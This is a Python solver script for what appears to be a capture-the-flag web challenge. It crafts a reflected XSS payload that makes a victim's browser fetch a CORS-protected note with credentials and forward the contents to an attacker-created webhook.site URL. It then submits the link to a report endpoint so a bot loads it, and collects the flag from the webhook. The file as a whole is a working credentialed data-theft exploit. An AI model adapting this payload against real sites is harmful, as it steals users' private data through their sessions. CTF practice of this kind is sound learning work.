import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import json
import time
from bs4 import BeautifulSoup

BASE_URL = "https://cors-xss.quoccacorp.com"
CORS_API_CALLER_URL = "https://cors-api-caller.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite_uuid = self.get_webhooksite_uuid()
        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"

    def get_webhooksite_uuid(self):
        response = self.session.post("https://webhook.site/token")
        return response.json()["uuid"]

    def find_flag_webhooksite(self, delay_seconds=3):
        time.sleep(delay_seconds)
        response = self.session.get(self.webhooksite_requests_url)
        response_json = response.json()
        response_json_text = json.dumps(response_json, indent=2)
        find_flag(response_json_text)

    def main(self):
        # response = self.session.get(CORS_API_CALLER_URL)
        # soup = BeautifulSoup(response.text, "html.parser")
        # script_element = soup.find("script")
        # print(script_element)

        PAYLOAD = f'''<script>
const API = "https://cors-api.quoccacorp.com";
const MY_ORIGIN = "{BASE_URL}";

fetch(`${{API}}/note?cors-allow-origin=${{encodeURIComponent(MY_ORIGIN)}}`, {{credentials: "include"}})
.then(response => response.text())
.then(responseText => fetch(`{self.webhooksite_url}?q=${{responseText}}`));
</script>'''

        response = self.session.get(BASE_URL, params={"name": PAYLOAD})
        self.session.post(f"{BASE_URL}/report", data={"url": response.url})
        self.find_flag_webhooksite()

if __name__ == "__main__":
    Solver().main()
